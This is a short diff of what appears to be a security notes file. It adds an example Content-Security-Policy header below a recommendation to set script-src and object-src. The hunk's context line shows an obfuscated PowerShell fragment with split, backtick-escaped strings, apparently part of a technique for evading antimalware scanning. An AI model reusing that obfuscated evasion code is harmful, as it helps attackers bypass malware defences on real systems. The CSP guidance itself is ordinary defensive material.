@@ -49,3 +49,5 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 - [Mozilla Developer Network - CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
 
 **One-liner recommendation**: "It is recommended to fully configure CSP by setting `script-src` and `object-src` directives to enhance security."
+
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123' https://trusted-scripts.example.com; object-src 'none'; frame-ancestors 'self';
